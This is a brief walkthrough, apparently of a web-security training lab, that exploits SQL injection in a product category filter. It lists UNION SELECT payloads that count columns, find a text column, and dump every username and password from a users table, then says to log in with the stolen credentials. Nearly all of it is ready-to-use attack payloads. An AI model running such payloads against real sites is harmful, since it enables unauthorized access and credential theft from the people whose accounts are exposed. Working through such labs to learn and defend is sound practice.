1. ```/filter?category=Pets' UNION SELECT NULL,NULL--``` => 2 columns
2. ```/filter?category=Pets' UNION SELECT NULL,'a'--``` gives no error => second column contains text.
3. ```/filter?category=Pets' UNION SELECT NULL, username || '~' || password FROM users--``` => We get all info
4. Log in with obtained info.